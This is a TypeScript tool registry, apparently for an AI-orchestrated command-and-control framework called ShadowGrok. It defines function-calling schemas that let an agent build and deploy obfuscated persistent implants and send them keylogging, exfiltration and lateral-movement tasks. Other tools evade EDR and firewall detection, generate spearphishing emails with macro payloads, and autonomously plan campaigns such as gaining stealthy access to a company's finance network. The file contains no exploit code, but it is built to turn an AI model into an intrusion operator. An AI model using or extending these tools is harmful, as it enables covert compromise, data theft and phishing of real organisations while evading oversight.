/**
 * ShadowGrok C2 Tool Registry
 * Full implementation of rich C2 tools for natural language workflow orchestration
 * Compatible with OpenAI / xAI Grok tool calling format
 */

export interface ToolDefinition {
  type: "function";
  function: {
    name: string;
    description: string;
    parameters: {
      type: "object";
      properties: Record<string, any>;
      required?: string[];
    };
  };
}

export const SHADOWGROK_TOOLS: ToolDefinition[] = [
  {
    type: "function",
    function: {
      name: "generate_stealth_implant_config",
      description: "Generate a fully customized Go implant config with advanced stealth features (anti-analysis, traffic blending, jitter, encryption). Returns ready-to-compile JSON config.",
      parameters: {
        type: "object",
        properties: {
          target_os: { type: "string", enum: ["windows", "linux", "darwin"], description: "Target operating system" },
          stealth_level: { type: "string", enum: ["standard", "high", "maximum"], default: "high" },
          traffic_blend_profile: { type: "string", description: "e.g. 'spotify', 'discord', 'corporate_vpn', 'youtube', 'custom'" },
          custom_jitter_ms: { type: "string", description: "Jitter range e.g. '600-1800'" },
          enable_persistence: { type: "boolean", default: true },
          kill_switch_trigger: { type: "string", description: "e.g. '72h_no_beacon' or 'specific_date:2026-05-15'" },
          custom_sni: { type: "string", description: "Custom SNI for Cloudflare masquerade" }
        },
        required: ["target_os"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "compile_and_deploy_implant",
      description: "Compile the Go implant binary with the provided config, apply obfuscation, and deploy to the specified node. Returns deployment status and new implant ID.",
      parameters: {
        type: "object",
        properties: {
          node_id: { type: "string", description: "Target node ID from database (e.g. 'node_abc123')" },
          config: { type: "object", description: "Full implant config object returned by generate_stealth_implant_config" },
          build_flags: { type: "array", items: { type: "string" }, description: "Go build flags e.g. ['-tags=stealth', '-ldflags=-s -w']" },
          auto_start: { type: "boolean", default: true, description: "Automatically start the implant after deployment" }
        },
        required: ["node_id", "config"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "send_c2_task_to_implant",
      description: "Send a task (exec, screenshot, keylog, exfil, lateral movement, persistence, self-destruct, recon) to one or more live implants. Supports batching and scheduling.",
      parameters: {
        type: "object",
        properties: {
          implant_ids: { type: "array", items: { type: "string" }, description: "Array of implant IDs to target" },
          task_type: { 
            type: "string", 
            enum: ["exec", "download", "upload", "screenshot", "keylog", "lateral", "persist", "self_destruct", "recon", "sleep"] 
          },
          payload: { type: "object", description: "Task-specific payload (e.g. { command: 'whoami' }, { url: 'https://...' })" },
          timeout_seconds: { type: "number", default: 300 },
          scheduled_at: { type: "string", description: "ISO datetime for scheduled execution" }
        },
        required: ["implant_ids", "task_type"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "query_implant_status",
      description: "Query real-time status, last beacon time, active tasks, health metrics, and traffic stats for one or more implants.",
      parameters: {
        type: "object",
        properties: {
          implant_ids: { type: "array", items: { type: "string" } },
          include_traffic_stats: { type: "boolean", default: true },
          include_task_history: { type: "boolean", default: false }
        },
        required: ["implant_ids"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "trigger_kill_switch",
      description: "Trigger kill switch on implants, nodes, or globally. Supports immediate, graceful, scheduled, and dead-man modes with confirmation for high-risk scopes.",
      parameters: {
        type: "object",
        properties: {
          scope: { type: "string", enum: ["implant", "node", "global", "operation"] },
          target_ids: { type: "array", items: { type: "string" }, description: "Implant IDs, node IDs, or operation ID" },
          mode: { type: "string", enum: ["immediate", "graceful", "scheduled", "dead_man"] },
          reason: { type: "string", description: "Reason for kill switch activation (logged)" },
          confirmation_code: { type: "string", description: "Required confirmation code for global/immediate scope" },
          scheduled_at: { type: "string", description: "ISO datetime for scheduled kill switch" }
        },
        required: ["scope", "mode"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "analyze_traffic_and_suggest_evasion",
      description: "Analyze current Hysteria 2 traffic patterns on a node + optional external threat intel and return specific recommendations for better blending, new obfuscation, or protocol changes.",
      parameters: {
        type: "object",
        properties: {
          node_id: { type: "string", description: "Node ID to analyze" },
          time_window_hours: { type: "number", default: 24 },
          threat_model: { type: "string", description: "e.g. 'corporate_edr', 'national_firewall', 'isp_dpi', 'cloudflare'" },
          include_grok_threat_intel: { type: "boolean", default: true }
        },
        required: ["node_id"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "orchestrate_full_operation",
      description: "High-level autonomous planner. Takes a natural language operation goal and returns a complete phased campaign plan with exact tool calls, dependencies, and risk assessment. Use for complex multi-node campaigns.",
      parameters: {
        type: "object",
        properties: {
          operation_goal: { type: "string", description: "Natural language goal e.g. 'Establish persistent access in Acme Corp finance network with minimal detection risk and 72h dead-man switch'" },
          constraints: { type: "array", items: { type: "string" }, description: "Constraints e.g. ['no_persistence_on_critical_systems', 'avoid_monday_9am']" },
          max_phases: { type: "number", default: 6 },
          risk_tolerance: { type: "string", enum: ["low", "medium", "high"], default: "medium" }
        },
        required: ["operation_goal"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "run_panel_command",
      description: "Execute a shell command on the ShadowGrok panel server (restart services, rotate tokens, rebuild Docker, etc.). HIGH RISK — always requires explicit approval.",
      parameters: {
        type: "object",
        properties: {
          command: { type: "string", description: "Shell command to execute (e.g. 'systemctl restart hysteria-node-07')" },
          working_dir: { type: "string", default: "/home/workdir" },
          require_approval: { type: "boolean", default: true },
          timeout: { type: "number", default: 30 },
          dry_run: { type: "boolean", default: false }
        },
        required: ["command"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "update_node_config",
      description: "Dynamically update Hysteria 2 server configuration on a live node (ports, obfuscation method, rate limits, auth backend, etc.) and optionally hot-reload.",
      parameters: {
        type: "object",
        properties: {
          node_id: { type: "string" },
          config_patch: { type: "object", description: "Partial Hysteria YAML config to merge (e.g. { obfuscation: { type: 'salamander' } })" },
          hot_reload: { type: "boolean", default: true },
          restart_required: { type: "boolean", default: false }
        },
        required: ["node_id", "config_patch"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "query_hysteria_traffic_stats",
      description: "Fetch live traffic statistics, active connections, bandwidth usage, and error rates from the Hysteria Traffic Stats API for a specific node or globally.",
      parameters: {
        type: "object",
        properties: {
          node_id: { type: "string", description: "Leave empty for global stats" },
          metric: { type: "string", enum: ["connections", "bandwidth", "uptime", "errors", "all"], default: "all" },
          time_range_minutes: { type: "number", default: 60 }
        },
        required: []
      }
    }
  },

  {
    type: "function",
    function: {
      name: "create_or_update_subscription",
      description: "Create or update a client subscription profile with specific tags, formats, and expiration. Returns the subscription URL and token.",
      parameters: {
        type: "object",
        properties: {
          user_id: { type: "string" },
          tags: { type: "array", items: { type: "string" } },
          formats: { type: "array", items: { type: "string" }, default: ["hysteria2", "clash", "singbox"] },
          expires_at: { type: "string", description: "ISO datetime" },
          auto_rotate: { type: "boolean", default: true }
        },
        required: ["user_id"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "assess_opsec_risk",
      description: "Perform an OPSEC risk assessment on a proposed action or current node/implant state. Returns risk score (0-100), detected weaknesses, and mitigation recommendations.",
      parameters: {
        type: "object",
        properties: {
          action_description: { type: "string", description: "Description of the planned action" },
          target_node_id: { type: "string" },
          implant_id: { type: "string" },
          include_threat_model: { type: "boolean", default: true }
        },
        required: ["action_description"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "osint_domain_enum",
      description: "Perform OSINT domain enumeration on a target. Returns subdomains, DNS records, WHOIS data, and discovered services for reconnaissance.",
      parameters: {
        type: "object",
        properties: {
          domain: { type: "string", description: "Target domain to enumerate (e.g. 'target.com')" },
          include_subdomains: { type: "boolean", default: true },
          include_dns_records: { type: "boolean", default: true },
          include_whois: { type: "boolean", default: true },
          deep_scan: { type: "boolean", default: false }
        },
        required: ["domain"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "generate_spearphish",
      description: "Generate a customized spearphishing email template with payload attachment or link. Returns email template, attachment metadata, and delivery strategy.",
      parameters: {
        type: "object",
        properties: {
          target_profile: { type: "object", description: "Target info (industry, role, language, known contacts)" },
          payload_type: { type: "string", enum: ["attachment", "link", "macro_doc"], description: "Delivery mechanism" },
          pretext: { type: "string", description: "Social engineering pretext (e.g. 'invoice', 'job offer')" },
          urgency_level: { type: "string", enum: ["low", "medium", "high"], default: "medium" }
        },
        required: ["target_profile", "payload_type"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "deploy_nodes",
      description: "Deploy one or more Hysteria 2 C2 nodes to specified regions with given configuration. Returns node IDs, connection info, and deployment status.",
      parameters: {
        type: "object",
        properties: {
          regions: { type: "array", items: { type: "string" }, description: "Target regions (e.g. ['us-east-1', 'eu-central-1'])" },
          obfuscation: { type: "string", enum: ["salamander", "none"], default: "salamander" },
          provider: { type: "string", enum: ["aws", "gcp", "azure", "digitalocean"], default: "aws" },
          count_per_region: { type: "number", default: 1 },
          auto_start: { type: "boolean", default: true }
        },
        required: ["regions"]
      }
    }
  }
];

// Helper to get tool by name
export function getToolByName(name: string): ToolDefinition | undefined {
  return SHADOWGROK_TOOLS.find(t => t.function.name === name);
}

// List of all tool names (useful for allowedTools validation)
export const ALL_TOOL_NAMES = SHADOWGROK_TOOLS.map(t => t.function.name);